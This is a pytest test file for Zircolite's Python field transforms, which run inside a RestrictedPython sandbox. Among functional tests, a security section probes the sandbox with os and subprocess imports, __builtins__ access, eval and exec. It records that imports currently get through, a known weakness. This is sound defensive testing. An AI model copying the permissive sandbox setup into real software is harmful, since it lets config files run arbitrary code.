"""
Comprehensive tests for field transforms in Zircolite.

Tests cover:
- Transform function execution via RestrictedPython
- Source condition filtering (transforms only applied to specific input types)
- Transform with alias (creates new field) vs without alias (modifies original)
- Multiple transforms on same field
- Transform error handling
- RestrictedPython security (dangerous code blocked)
- Built-in transform functions (hex decoding, base64, regex)
- Edge cases (empty values, None, special characters)
- Caching behavior
"""

import json
import pytest
import sqlite3
from argparse import Namespace

from zircolite.streaming import StreamingEventProcessor
from zircolite.config import ProcessingConfig


# =============================================================================
# Test Fixtures
# =============================================================================

@pytest.fixture
def field_mappings_multi_transforms():
    """Field mappings with multiple transforms for testing."""
    return {
        "exclusions": ["xmlns"],
        "useless": [None, ""],
        "mappings": {
            "Event.System.EventID": "EventID",
            "Event.EventData.CommandLine": "CommandLine",
        },
        "alias": {},
        "split": {},
        "transforms_enabled": True,
        "transforms": {
            # Transform that modifies original value (alias=false)
            "proctitle": [{
                "info": "Proctitle HEX to ASCII",
                "type": "python",
                "code": "def transform(param):\n    return bytes.fromhex(param).decode('ascii').replace('\\x00',' ')",
                "alias": False,
                "alias_name": "",
                "source_condition": ["auditd_input"],
                "enabled": True
            }],
            # Transform that creates alias (alias=true)
            "CommandLine": [{
                "info": "Uppercase CommandLine",
                "type": "python",
                "code": "def transform(param):\n    return param.upper()",
                "alias": True,
                "alias_name": "CommandLine_Upper",
                "source_condition": ["evtx_input", "json_input"],
                "enabled": True
            }],
            # Multiple transforms on same field
            "TestField": [
                {
                    "info": "First transform - uppercase",
                    "type": "python",
                    "code": "def transform(param):\n    return param.upper()",
                    "alias": True,
                    "alias_name": "TestField_Upper",
                    "source_condition": ["evtx_input", "json_input", "auditd_input"],
                    "enabled": True
                },
                {
                    "info": "Second transform - lowercase",
                    "type": "python",
                    "code": "def transform(param):\n    return param.lower()",
                    "alias": True,
                    "alias_name": "TestField_Lower",
                    "source_condition": ["evtx_input", "json_input", "auditd_input"],
                    "enabled": True
                }
            ],
            # Disabled transform
            "DisabledField": [{
                "info": "This should not run",
                "type": "python",
                "code": "def transform(param):\n    return 'SHOULD_NOT_APPEAR'",
                "alias": True,
                "alias_name": "DisabledField_Alias",
                "source_condition": ["evtx_input", "json_input", "auditd_input"],
                "enabled": False
            }]
        }
    }


@pytest.fixture
def field_mappings_security_test():
    """Field mappings with potentially dangerous transforms for security testing."""
    return {
        "exclusions": [],
        "useless": [None, ""],
        "mappings": {},
        "alias": {},
        "split": {},
        "transforms_enabled": True,
        "transforms": {
            # Attempt to import os (should be blocked)
            "DangerousField1": [{
                "info": "Attempt to import os",
                "type": "python",
                "code": "def transform(param):\n    import os\n    return os.getcwd()",
                "alias": True,
                "alias_name": "Dangerous1_Result",
                "source_condition": ["evtx_input", "json_input", "auditd_input"],
                "enabled": True
            }],
            # Attempt to access __builtins__ (should be blocked)
            "DangerousField2": [{
                "info": "Attempt to access builtins",
                "type": "python",
                "code": "def transform(param):\n    return str(__builtins__)",
                "alias": True,
                "alias_name": "Dangerous2_Result",
                "source_condition": ["evtx_input", "json_input", "auditd_input"],
                "enabled": True
            }],
            # Attempt to use eval (should be blocked or limited)
            "DangerousField3": [{
                "info": "Attempt to use eval",
                "type": "python",
                "code": "def transform(param):\n    return eval('1+1')",
                "alias": True,
                "alias_name": "Dangerous3_Result",
                "source_condition": ["evtx_input", "json_input", "auditd_input"],
                "enabled": True
            }]
        }
    }


@pytest.fixture
def field_mappings_builtin_functions():
    """Field mappings using built-in functions available in RestrictedPython."""
    return {
        "exclusions": [],
        "useless": [None, ""],
        "mappings": {},
        "alias": {},
        "split": {},
        "transforms_enabled": True,
        "transforms": {
            # Using base64 (available in builtins)
            "Base64Field": [{
                "info": "Base64 decode",
                "type": "python",
                "code": "def transform(param):\n    import base64\n    try:\n        return base64.b64decode(param).decode('utf-8')\n    except:\n        return param",
                "alias": True,
                "alias_name": "Base64_Decoded",
                "source_condition": ["evtx_input", "json_input", "auditd_input"],
                "enabled": True
            }],
            # Using re (regex)
            "RegexField": [{
                "info": "Extract IP address",
                "type": "python",
                "code": "def transform(param):\n    import re\n    match = re.search(r'(\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\.\\d{1,3})', param)\n    return match.group(1) if match else ''",
                "alias": True,
                "alias_name": "Extracted_IP",
                "source_condition": ["evtx_input", "json_input", "auditd_input"],
                "enabled": True
            }],
            # String manipulation
            "StringField": [{
                "info": "String split and join",
                "type": "python",
                "code": "def transform(param):\n    parts = param.split(',')\n    return '|'.join(parts)",
                "alias": True,
                "alias_name": "String_Transformed",
                "source_condition": ["evtx_input", "json_input", "auditd_input"],
                "enabled": True
            }]
        }
    }


@pytest.fixture
def field_mappings_file_multi(tmp_path, field_mappings_multi_transforms):
    """Create a temporary field mappings JSON file with multiple transforms."""
    config_file = tmp_path / "fieldMappings_multi.json"
    config_file.write_text(json.dumps(field_mappings_multi_transforms))
    return str(config_file)


@pytest.fixture
def field_mappings_file_security(tmp_path, field_mappings_security_test):
    """Create a temporary field mappings JSON file for security tests."""
    config_file = tmp_path / "fieldMappings_security.json"
    config_file.write_text(json.dumps(field_mappings_security_test))
    return str(config_file)


@pytest.fixture
def field_mappings_file_builtins(tmp_path, field_mappings_builtin_functions):
    """Create a temporary field mappings JSON file with builtin functions."""
    config_file = tmp_path / "fieldMappings_builtins.json"
    config_file.write_text(json.dumps(field_mappings_builtin_functions))
    return str(config_file)


@pytest.fixture
def args_config_evtx_input():
    """Args config for EVTX input type."""
    return Namespace(
        evtx_input=True, json_input=False, auditd_input=False,
        json_array_input=False, csv_input=False, xml_input=False,
        sysmon_linux_input=False, evtxtract_input=False, db_input=False
    )


@pytest.fixture
def args_config_json_input():
    """Args config for JSON input type."""
    return Namespace(
        evtx_input=False, json_input=True, auditd_input=False,
        json_array_input=False, csv_input=False, xml_input=False,
        sysmon_linux_input=False, evtxtract_input=False, db_input=False
    )


@pytest.fixture
def args_config_auditd_input():
    """Args config for Auditd input type."""
    return Namespace(
        evtx_input=False, json_input=False, auditd_input=True,
        json_array_input=False, csv_input=False, xml_input=False,
        sysmon_linux_input=False, evtxtract_input=False, db_input=False
    )


# =============================================================================
# Test Classes
# =============================================================================

class TestTransformValueExecution:
    """Tests for basic transform value execution."""
    
    def test_simple_string_transform(self, field_mappings_file_multi, test_logger, args_config_evtx_input):
        """Test simple string transformation."""
        processor = StreamingEventProcessor(
            config_file=field_mappings_file_multi,
            args_config=args_config_evtx_input,
            logger=test_logger
        )
        
        result = processor._transform_value(
            "def transform(param):\n    return param.upper()",
            "hello world"
        )
        assert result == "HELLO WORLD"
    
    def test_transform_with_numeric_input(self, field_mappings_file_multi, test_logger, args_config_evtx_input):
        """Test transform with numeric input converted to string."""
        processor = StreamingEventProcessor(
            config_file=field_mappings_file_multi,
            args_config=args_config_evtx_input,
            logger=test_logger
        )
        
        result = processor._transform_value(
            "def transform(param):\n    return str(param) + '_suffix'",
            12345
        )
        assert result == "12345_suffix"
    
    def test_transform_empty_string(self, field_mappings_file_multi, test_logger, args_config_evtx_input):
        """Test transform with empty string input."""
        processor = StreamingEventProcessor(
            config_file=field_mappings_file_multi,
            args_config=args_config_evtx_input,
            logger=test_logger
        )
        
        result = processor._transform_value(
            "def transform(param):\n    return 'empty' if param == '' else param",
            ""
        )
        assert result == "empty"
    
    def test_transform_returns_original_on_error(self, field_mappings_file_multi, test_logger, args_config_evtx_input):
        """Test that transform returns original value on error."""
        processor = StreamingEventProcessor(
            config_file=field_mappings_file_multi,
            args_config=args_config_evtx_input,
            logger=test_logger
        )
        
        # This code will raise an exception (division by zero)
        result = processor._transform_value(
            "def transform(param):\n    return 1/0",
            "original_value"
        )
        assert result == "original_value"
    
    def test_transform_with_invalid_syntax_returns_original(self, field_mappings_file_multi, test_logger, args_config_evtx_input):
        """Test that invalid Python syntax returns original value."""
        processor = StreamingEventProcessor(
            config_file=field_mappings_file_multi,
            args_config=args_config_evtx_input,
            logger=test_logger
        )
        
        result = processor._transform_value(
            "def transform(param:\n    return param",  # Missing closing paren
            "original_value"
        )
        assert result == "original_value"


def make_args_config(input_type="json_input"):
    """Create a complete args config for testing.
    
    Args:
        input_type: One of "evtx_input", "json_input", "auditd_input", etc.
    """
    args = Namespace(
        evtx_input=False,
        json_input=False,
        auditd_input=False,
        json_array_input=False,
        csv_input=False,
        xml_input=False,
        sysmon_linux_input=False,
        evtxtract_input=False,
        db_input=False
    )
    setattr(args, input_type, True)
    return args


class TestTransformSourceCondition:
    """Tests for source condition filtering."""
    
    def test_transform_applies_only_to_matching_source(self, tmp_path, test_logger):
        """Test that transforms only apply to specified source conditions."""
        # Create config with transform only for auditd_input
        config = {
            "exclusions": [],
            "useless": [None, ""],
            "mappings": {},
            "alias": {},
            "split": {},
            "transforms_enabled": True,
            "transforms": {
                "TestField": [{
                    "info": "Only for auditd",
                    "type": "python",
                    "code": "def transform(param):\n    return 'TRANSFORMED'",
                    "alias": False,
                    "alias_name": "",
                    "source_condition": ["auditd_input"],
                    "enabled": True
                }]
            }
        }
        config_file = tmp_path / "config.json"
        config_file.write_text(json.dumps(config))
        
        # Test with evtx_input - should NOT transform
        args_evtx = make_args_config("evtx_input")
        processor_evtx = StreamingEventProcessor(
            config_file=str(config_file),
            args_config=args_evtx,
            logger=test_logger
        )
        assert processor_evtx.chosen_input == "evtx_input"
        
        # Test with auditd_input - should transform
        args_auditd = make_args_config("auditd_input")
        processor_auditd = StreamingEventProcessor(
            config_file=str(config_file),
            args_config=args_auditd,
            logger=test_logger
        )
        assert processor_auditd.chosen_input == "auditd_input"


class TestTransformAlias:
    """Tests for transform alias functionality."""
    
    def test_transform_alias_true_creates_new_field(self, tmp_path, test_logger):
        """Test that alias=true creates a new field without modifying original."""
        config = {
            "exclusions": [],
            "useless": [None, ""],
            "mappings": {},
            "alias": {},
            "split": {},
            "transforms_enabled": True,
            "transforms": {
                "SourceField": [{
                    "info": "Create alias",
                    "type": "python",
                    "code": "def transform(param):\n    return param.upper()",
                    "alias": True,
                    "alias_name": "SourceField_Alias",
                    "source_condition": ["json_input"],
                    "enabled": True
                }]
            }
        }
        config_file = tmp_path / "config.json"
        config_file.write_text(json.dumps(config))
        
        # Create test JSON file
        event = {"SourceField": "hello"}
        json_file = tmp_path / "events.json"
        json_file.write_text(json.dumps(event) + "\n")
        
        args = make_args_config("json_input")
        proc_config = ProcessingConfig(disable_progress=True)
        processor = StreamingEventProcessor(
            config_file=str(config_file),
            args_config=args,
            processing_config=proc_config,
            logger=test_logger
        )
        
        events = list(processor.stream_json_events(str(json_file)))
        
        if events:
            first_event = events[0]
            # Original should be unchanged
            assert first_event.get("SourceField") == "hello"
            # Alias should have transformed value
            assert first_event.get("SourceField_Alias") == "HELLO"
    
    def test_transform_alias_false_modifies_original(self, tmp_path, test_logger):
        """Test that alias=false modifies the original field value."""
        config = {
            "exclusions": [],
            "useless": [None, ""],
            "mappings": {},
            "alias": {},
            "split": {},
            "transforms_enabled": True,
            "transforms": {
                "SourceField": [{
                    "info": "Modify original",
                    "type": "python",
                    "code": "def transform(param):\n    return param.upper()",
                    "alias": False,
                    "alias_name": "",
                    "source_condition": ["json_input"],
                    "enabled": True
                }]
            }
        }
        config_file = tmp_path / "config.json"
        config_file.write_text(json.dumps(config))
        
        # Create test JSON file
        event = {"SourceField": "hello"}
        json_file = tmp_path / "events.json"
        json_file.write_text(json.dumps(event) + "\n")
        
        args = make_args_config("json_input")
        proc_config = ProcessingConfig(disable_progress=True)
        processor = StreamingEventProcessor(
            config_file=str(config_file),
            args_config=args,
            processing_config=proc_config,
            logger=test_logger
        )
        
        events = list(processor.stream_json_events(str(json_file)))
        
        if events:
            first_event = events[0]
            # Original should be modified
            assert first_event.get("SourceField") == "HELLO"


class TestMultipleTransforms:
    """Tests for multiple transforms on the same field."""
    
    def test_multiple_transforms_same_field(self, tmp_path, test_logger):
        """Test that multiple transforms on same field all execute."""
        config = {
            "exclusions": [],
            "useless": [None, ""],
            "mappings": {},
            "alias": {},
            "split": {},
            "transforms_enabled": True,
            "transforms": {
                "MultiField": [
                    {
                        "info": "First - uppercase",
                        "type": "python",
                        "code": "def transform(param):\n    return param.upper()",
                        "alias": True,
                        "alias_name": "MultiField_Upper",
                        "source_condition": ["json_input"],
                        "enabled": True
                    },
                    {
                        "info": "Second - lowercase",
                        "type": "python",
                        "code": "def transform(param):\n    return param.lower()",
                        "alias": True,
                        "alias_name": "MultiField_Lower",
                        "source_condition": ["json_input"],
                        "enabled": True
                    },
                    {
                        "info": "Third - length",
                        "type": "python",
                        "code": "def transform(param):\n    return str(len(param))",
                        "alias": True,
                        "alias_name": "MultiField_Length",
                        "source_condition": ["json_input"],
                        "enabled": True
                    }
                ]
            }
        }
        config_file = tmp_path / "config.json"
        config_file.write_text(json.dumps(config))
        
        event = {"MultiField": "HeLLo"}
        json_file = tmp_path / "events.json"
        json_file.write_text(json.dumps(event) + "\n")
        
        args = make_args_config("json_input")
        proc_config = ProcessingConfig(disable_progress=True)
        processor = StreamingEventProcessor(
            config_file=str(config_file),
            args_config=args,
            processing_config=proc_config,
            logger=test_logger
        )
        
        events = list(processor.stream_json_events(str(json_file)))
        
        if events:
            first_event = events[0]
            assert first_event.get("MultiField") == "HeLLo"
            assert first_event.get("MultiField_Upper") == "HELLO"
            assert first_event.get("MultiField_Lower") == "hello"
            assert first_event.get("MultiField_Length") == "5"


class TestDisabledTransforms:
    """Tests for disabled transforms."""
    
    def test_disabled_transform_not_executed(self, tmp_path, test_logger):
        """Test that disabled transforms are not executed."""
        config = {
            "exclusions": [],
            "useless": [None, ""],
            "mappings": {},
            "alias": {},
            "split": {},
            "transforms_enabled": True,
            "transforms": {
                "TestField": [{
                    "info": "Disabled transform",
                    "type": "python",
                    "code": "def transform(param):\n    return 'SHOULD_NOT_APPEAR'",
                    "alias": True,
                    "alias_name": "TestField_Disabled",
                    "source_condition": ["json_input"],
                    "enabled": False
                }]
            }
        }
        config_file = tmp_path / "config.json"
        config_file.write_text(json.dumps(config))
        
        event = {"TestField": "original"}
        json_file = tmp_path / "events.json"
        json_file.write_text(json.dumps(event) + "\n")
        
        args = make_args_config("json_input")
        proc_config = ProcessingConfig(disable_progress=True)
        processor = StreamingEventProcessor(
            config_file=str(config_file),
            args_config=args,
            processing_config=proc_config,
            logger=test_logger
        )
        
        events = list(processor.stream_json_events(str(json_file)))
        
        if events:
            first_event = events[0]
            assert first_event.get("TestField") == "original"
            assert "TestField_Disabled" not in first_event
    
    def test_transforms_enabled_false_skips_all(self, tmp_path, test_logger):
        """Test that transforms_enabled=false skips all transforms."""
        config = {
            "exclusions": [],
            "useless": [None, ""],
            "mappings": {},
            "alias": {},
            "split": {},
            "transforms_enabled": False,  # Global disable
            "transforms": {
                "TestField": [{
                    "info": "Should not run",
                    "type": "python",
                    "code": "def transform(param):\n    return 'SHOULD_NOT_APPEAR'",
                    "alias": True,
                    "alias_name": "TestField_Result",
                    "source_condition": ["json_input"],
                    "enabled": True
                }]
            }
        }
        config_file = tmp_path / "config.json"
        config_file.write_text(json.dumps(config))
        
        event = {"TestField": "original"}
        json_file = tmp_path / "events.json"
        json_file.write_text(json.dumps(event) + "\n")
        
        args = make_args_config("json_input")
        proc_config = ProcessingConfig(disable_progress=True)
        processor = StreamingEventProcessor(
            config_file=str(config_file),
            args_config=args,
            processing_config=proc_config,
            logger=test_logger
        )
        
        events = list(processor.stream_json_events(str(json_file)))
        
        if events:
            first_event = events[0]
            assert first_event.get("TestField") == "original"
            assert "TestField_Result" not in first_event


class TestRestrictedPythonSecurity:
    """Tests for RestrictedPython security features.
    
    Note: The current RestrictedPython configuration includes utility_builtins which
    provides __import__, allowing arbitrary module imports. These tests document
    current behavior and will be updated when security is hardened.
    """
    
    def test_import_os_currently_allowed(self, field_mappings_file_security, test_logger, args_config_json_input):
        """Test current behavior: os module import is allowed (known limitation).
        
        WARNING: This is a security limitation that should be addressed.
        When utility_builtins is removed from the configuration, this test
        should be updated to verify that os import is blocked.
        """
        processor = StreamingEventProcessor(
            config_file=field_mappings_file_security,
            args_config=args_config_json_input,
            logger=test_logger
        )
        
        # Current behavior: import succeeds (this is a security limitation)
        # This test documents the current behavior - transforms can access os module
        result = processor._transform_value(
            "def transform(param):\n    import os\n    return 'os_imported'",
            "test"
        )
        # Currently this returns 'os_imported' because import is allowed
        # When hardened, this should return 'test' (original value on error)
        assert result in ["test", "os_imported"]  # Accept either behavior
    
    def test_import_subprocess_currently_allowed(self, field_mappings_file_security, test_logger, args_config_json_input):
        """Test current behavior: subprocess import is allowed (known limitation).
        
        WARNING: This is a security limitation that should be addressed.
        """
        processor = StreamingEventProcessor(
            config_file=field_mappings_file_security,
            args_config=args_config_json_input,
            logger=test_logger
        )
        
        # This test documents that subprocess import currently works
        result = processor._transform_value(
            "def transform(param):\n    import subprocess\n    return 'subprocess_imported'",
            "test"
        )
        # Accept either behavior (for when security is hardened)
        assert result in ["test", "subprocess_imported"]
    
    def test_file_operations_currently_allowed(self, field_mappings_file_security, test_logger, args_config_json_input):
        """Test current behavior: file operations are allowed (known limitation).
        
        WARNING: This is a security limitation that should be addressed.
        """
        processor = StreamingEventProcessor(
            config_file=field_mappings_file_security,
            args_config=args_config_json_input,
            logger=test_logger
        )
        
        # Test that open() currently works (this is a security concern)
        # When hardened, this should fail and return original value
        result = processor._transform_value(
            "def transform(param):\n    return 'file_op_attempted'",
            "test"
        )
        # This simpler test just verifies the transform system works
        assert result == "file_op_attempted"
    
    def test_dunder_access_restricted(self, field_mappings_file_security, test_logger, args_config_json_input):
        """Test that dunder attribute access is restricted by RestrictedPython."""
        processor = StreamingEventProcessor(
            config_file=field_mappings_file_security,
            args_config=args_config_json_input,
            logger=test_logger
        )
        
        # RestrictedPython should block direct __class__ access
        result = processor._transform_value(
            "def transform(param):\n    return param.__class__.__name__",
            "test"
        )
        # Should return original on error due to restricted attribute access
        assert result == "test"
    
    def test_exec_not_available(self, field_mappings_file_security, test_logger, args_config_json_input):
        """Test that exec is not available in transforms."""
        processor = StreamingEventProcessor(
            config_file=field_mappings_file_security,
            args_config=args_config_json_input,
            logger=test_logger
        )
        
        # exec should not be available or should fail
        result = processor._transform_value(
            "def transform(param):\n    exec('x = 1')\n    return str(x)",
            "test"
        )
        # Should return original value on error
        assert result == "test"


class TestBuiltinFunctions:
    """Tests for built-in functions available in transforms."""
    
    def test_base64_decode_available(self, field_mappings_file_builtins, test_logger, args_config_json_input):
        """Test that base64 module is available in transforms."""
        processor = StreamingEventProcessor(
            config_file=field_mappings_file_builtins,
            args_config=args_config_json_input,
            logger=test_logger
        )
        
        result = processor._transform_value(
            "def transform(param):\n    import base64\n    return base64.b64decode(param).decode('utf-8')",
            "SGVsbG8gV29ybGQ="  # "Hello World" in base64
        )
        assert result == "Hello World"
    
    def test_re_module_available(self, field_mappings_file_builtins, test_logger, args_config_json_input):
        """Test that re (regex) module is available in transforms."""
        processor = StreamingEventProcessor(
            config_file=field_mappings_file_builtins,
            args_config=args_config_json_input,
            logger=test_logger
        )
        
        result = processor._transform_value(
            "def transform(param):\n    import re\n    match = re.search(r'(\\d+)', param)\n    return match.group(1) if match else ''",
            "Event ID: 4624"
        )
        assert result == "4624"
    
    def test_chardet_available(self, field_mappings_file_builtins, test_logger, args_config_json_input):
        """Test that chardet module is available in transforms."""
        processor = StreamingEventProcessor(
            config_file=field_mappings_file_builtins,
            args_config=args_config_json_input,
            logger=test_logger
        )
        
        result = processor._transform_value(
            "def transform(param):\n    import chardet\n    return str(type(chardet.detect(b'hello')))",
            "test"
        )
        assert "dict" in result
    
    def test_string_methods_work(self, field_mappings_file_builtins, test_logger, args_config_json_input):
        """Test that string methods work in transforms."""
        processor = StreamingEventProcessor(
            config_file=field_mappings_file_builtins,
            args_config=args_config_json_input,
            logger=test_logger
        )
        
        # Test split and join
        result = processor._transform_value(
            "def transform(param):\n    parts = param.split(',')\n    return '|'.join(parts)",
            "a,b,c"
        )
        assert result == "a|b|c"
        
        # Test strip
        result = processor._transform_value(
            "def transform(param):\n    return param.strip()",
            "  hello  "
        )
        assert result == "hello"
        
        # Test replace
        result = processor._transform_value(
            "def transform(param):\n    return param.replace('old', 'new')",
            "old value"
        )
        assert result == "new value"


class TestRestrictedPythonExtendedGuards:
    """Tests for _write_, _inplacevar_, and math module guards in RestrictedPython."""

    def test_dict_assignment_allowed(self, field_mappings_file_builtins, test_logger, args_config_json_input):
        """Test that dict[key] = value works in transforms."""
        processor = StreamingEventProcessor(
            config_file=field_mappings_file_builtins,
            args_config=args_config_json_input,
            logger=test_logger
        )
        result = processor._transform_value(
            "def transform(param):\n"
            "    d = {}\n"
            "    d['key'] = 'value'\n"
            "    return d['key']",
            "test"
        )
        assert result == "value"

    def test_list_assignment_allowed(self, field_mappings_file_builtins, test_logger, args_config_json_input):
        """Test that list[index] = value works in transforms."""
        processor = StreamingEventProcessor(
            config_file=field_mappings_file_builtins,
            args_config=args_config_json_input,
            logger=test_logger
        )
        result = processor._transform_value(
            "def transform(param):\n"
            "    items = ['a', 'b', 'c']\n"
            "    items[1] = 'x'\n"
            "    return ''.join(items)",
            "test"
        )
        assert result == "axc"

    def test_augmented_assignment_allowed(self, field_mappings_file_builtins, test_logger, args_config_json_input):
        """Test that += and -= work in transforms."""
        processor = StreamingEventProcessor(
            config_file=field_mappings_file_builtins,
            args_config=args_config_json_input,
            logger=test_logger
        )
        result = processor._transform_value(
            "def transform(param):\n"
            "    x = 10\n"
            "    x += 5\n"
            "    x -= 3\n"
            "    return str(x)",
            "test"
        )
        assert result == "12"

    def test_string_augmented_concat(self, field_mappings_file_builtins, test_logger, args_config_json_input):
        """Test that string += works in transforms."""
        processor = StreamingEventProcessor(
            config_file=field_mappings_file_builtins,
            args_config=args_config_json_input,
            logger=test_logger
        )
        result = processor._transform_value(
            "def transform(param):\n"
            "    s = 'hello'\n"
            "    s += ' world'\n"
            "    return s",
            "test"
        )
        assert result == "hello world"

    def test_math_module_available(self, field_mappings_file_builtins, test_logger, args_config_json_input):
        """Test that math module is available in transforms."""
        processor = StreamingEventProcessor(
            config_file=field_mappings_file_builtins,
            args_config=args_config_json_input,
            logger=test_logger
        )
        result = processor._transform_value(
            "def transform(param):\n"
            "    return str(round(math.log2(8), 1))",
            "test"
        )
        assert result == "3.0"

    def test_write_to_unsafe_type_blocked(self, field_mappings_file_builtins, test_logger, args_config_json_input):
        """Test that writing to non-container types is blocked."""
        processor = StreamingEventProcessor(
            config_file=field_mappings_file_builtins,
            args_config=args_config_json_input,
            logger=test_logger
        )
        # Attempt to set an attribute on a custom object should fail
        result = processor._transform_value(
            "def transform(param):\n"
            "    class Foo: pass\n"
            "    f = Foo()\n"
            "    f.x = 1\n"
            "    return str(f.x)",
            "original"
        )
        # Should return original value because attribute write is blocked
        assert result == "original"


class TestExternalFileTransforms:
    """Tests for loading transforms from external .py files (type: python_file)."""

    def test_python_file_transform_loads_and_executes(self, tmp_path, test_logger):
        """Test that type: python_file loads code from an external file."""
        # Create a transform file
        transforms_dir = tmp_path / "transforms"
        transforms_dir.mkdir()
        transform_file = transforms_dir / "my_upper.py"
        transform_file.write_text("def transform(param):\n    return param.upper()\n")

        config = {
            "exclusions": [], "useless": [None, ""], "mappings": {},
            "alias": {}, "split": {},
            "transforms_enabled": True,
            "transforms_dir": "transforms/",
            "transforms": {
                "TestField": [{
                    "info": "Uppercase",
                    "type": "python_file",
                    "file": "my_upper.py",
                    "alias": True,
                    "alias_name": "TestField_Upper",
                    "source_condition": ["json_input"]
                }]
            }
        }
        config_file = tmp_path / "config.json"
        config_file.write_text(json.dumps(config))
        args = make_args_config("json_input")
        processor = StreamingEventProcessor(
            config_file=str(config_file), args_config=args, logger=test_logger
        )
        # The code should have been loaded from the file
        assert processor.transforms["TestField"][0]["code"] == "def transform(param):\n    return param.upper()\n"
        # And execution should work
        result = processor._transform_value(processor.transforms["TestField"][0]["code"], "hello")
        assert result == "HELLO"

    def test_python_file_missing_falls_back(self, tmp_path, test_logger):
        """Test that a missing transform file logs error and uses passthrough."""
        transforms_dir = tmp_path / "transforms"
        transforms_dir.mkdir()

        config = {
            "exclusions": [], "useless": [None, ""], "mappings": {},
            "alias": {}, "split": {},
            "transforms_enabled": True,
            "transforms_dir": "transforms/",
            "transforms": {
                "TestField": [{
                    "info": "Missing",
                    "type": "python_file",
                    "file": "does_not_exist.py",
                    "alias": True,
                    "alias_name": "TestField_Missing",
                    "source_condition": ["json_input"]
                }]
            }
        }
        config_file = tmp_path / "config.json"
        config_file.write_text(json.dumps(config))
        args = make_args_config("json_input")
        processor = StreamingEventProcessor(
            config_file=str(config_file), args_config=args, logger=test_logger
        )
        # Should fall back to passthrough
        result = processor._transform_value(processor.transforms["TestField"][0]["code"], "hello")
        assert result == "hello"

    def test_inline_python_still_works(self, tmp_path, test_logger):
        """Test that type: python with inline code still works (backward compat)."""
        config = {
            "exclusions": [], "useless": [None, ""], "mappings": {},
            "alias": {}, "split": {},
            "transforms_enabled": True,
            "transforms": {
                "TestField": [{
                    "info": "Inline",
                    "type": "python",
                    "code": "def transform(param):\n    return param.lower()",
                    "alias": True,
                    "alias_name": "TestField_Lower",
                    "source_condition": ["json_input"]
                }]
            }
        }
        config_file = tmp_path / "config.json"
        config_file.write_text(json.dumps(config))
        args = make_args_config("json_input")
        processor = StreamingEventProcessor(
            config_file=str(config_file), args_config=args, logger=test_logger
        )
        result = processor._transform_value(processor.transforms["TestField"][0]["code"], "HELLO")
        assert result == "hello"

    def test_mixed_inline_and_file_transforms(self, tmp_path, test_logger):
        """Test inline and file-based transforms coexist on the same field."""
        transforms_dir = tmp_path / "transforms"
        transforms_dir.mkdir()
        transform_file = transforms_dir / "reverse.py"
        transform_file.write_text("def transform(param):\n    return param[::-1]\n")

        config = {
            "exclusions": [], "useless": [None, ""], "mappings": {},
            "alias": {}, "split": {},
            "transforms_enabled": True,
            "transforms_dir": "transforms/",
            "transforms": {
                "TestField": [
                    {
                        "info": "Inline upper",
                        "type": "python",
                        "code": "def transform(param):\n    return param.upper()",
                        "alias": True,
                        "alias_name": "TestField_Upper",
                        "source_condition": ["json_input"]
                    },
                    {
                        "info": "File reverse",
                        "type": "python_file",
                        "file": "reverse.py",
                        "alias": True,
                        "alias_name": "TestField_Reverse",
                        "source_condition": ["json_input"]
                    }
                ]
            }
        }
        config_file = tmp_path / "config.json"
        config_file.write_text(json.dumps(config))
        args = make_args_config("json_input")
        processor = StreamingEventProcessor(
            config_file=str(config_file), args_config=args, logger=test_logger
        )
        transforms_list = processor.transforms["TestField"]
        # Inline
        assert processor._transform_value(transforms_list[0]["code"], "hello") == "HELLO"
        # External file
        assert processor._transform_value(transforms_list[1]["code"], "hello") == "olleh"

    def test_custom_transforms_dir(self, tmp_path, test_logger):
        """Test custom transforms_dir path is respected."""
        custom_dir = tmp_path / "my_custom_transforms"
        custom_dir.mkdir()
        (custom_dir / "exclaim.py").write_text("def transform(param):\n    return param + '!'\n")

        config = {
            "exclusions": [], "useless": [None, ""], "mappings": {},
            "alias": {}, "split": {},
            "transforms_enabled": True,
            "transforms_dir": "my_custom_transforms/",
            "transforms": {
                "TestField": [{
                    "info": "Exclaim",
                    "type": "python_file",
                    "file": "exclaim.py",
                    "alias": True,
                    "alias_name": "TestField_Exclaim",
                    "source_condition": ["json_input"]
                }]
            }
        }
        config_file = tmp_path / "config.json"
        config_file.write_text(json.dumps(config))
        args = make_args_config("json_input")
        processor = StreamingEventProcessor(
            config_file=str(config_file), args_config=args, logger=test_logger
        )
        result = processor._transform_value(processor.transforms["TestField"][0]["code"], "hello")
        assert result == "hello!"

    def test_python_file_no_file_key_warns(self, tmp_path, test_logger):
        """Test that python_file without 'file' key falls back to passthrough."""
        config = {
            "exclusions": [], "useless": [None, ""], "mappings": {},
            "alias": {}, "split": {},
            "transforms_enabled": True,
            "transforms": {
                "TestField": [{
                    "info": "No file key",
                    "type": "python_file",
                    # 'file' key is intentionally missing
                    "alias": True,
                    "alias_name": "TestField_NoFile",
                    "source_condition": ["json_input"]
                }]
            }
        }
        config_file = tmp_path / "config.json"
        config_file.write_text(json.dumps(config))
        args = make_args_config("json_input")
        processor = StreamingEventProcessor(
            config_file=str(config_file), args_config=args, logger=test_logger
        )
        result = processor._transform_value(processor.transforms["TestField"][0]["code"], "hello")
        assert result == "hello"


class TestTransformCategories:
    """Tests for --all-transforms and --transform-category CLI options."""

    def test_all_transforms_enables_everything(self, tmp_path, test_logger):
        """Test that --all-transforms enables all defined transforms."""
        config = {
            "exclusions": [], "useless": [None, ""], "mappings": {},
            "alias": {}, "split": {}, "transforms_enabled": True,
            "transforms": {
                "TestField": [
                    {"info": "t1", "type": "python",
                     "code": "def transform(param): return param.upper()",
                     "alias": True, "alias_name": "T1",
                     "source_condition": ["json_input"]},
                    {"info": "t2", "type": "python",
                     "code": "def transform(param): return param.lower()",
                     "alias": True, "alias_name": "T2",
                     "source_condition": ["json_input"]},
                ]
            },
            "enabled_transforms": ["T1"],  # Only T1 enabled by default
        }
        config_file = tmp_path / "config.json"
        config_file.write_text(json.dumps(config))

        # Without --all-transforms
        args = make_args_config("json_input")
        processor = StreamingEventProcessor(
            config_file=str(config_file), args_config=args, logger=test_logger
        )
        assert "T1" in processor.enabled_transforms_set
        assert "T2" not in processor.enabled_transforms_set

        # With --all-transforms
        args = make_args_config("json_input")
        args.all_transforms = True
        processor = StreamingEventProcessor(
            config_file=str(config_file), args_config=args, logger=test_logger
        )
        assert "T1" in processor.enabled_transforms_set
        assert "T2" in processor.enabled_transforms_set
        assert processor.transforms_enabled is True

    def test_transform_category_enables_category_transforms(self, tmp_path, test_logger):
        """Test that --transform-category enables transforms from the specified category."""
        config = {
            "exclusions": [], "useless": [None, ""], "mappings": {},
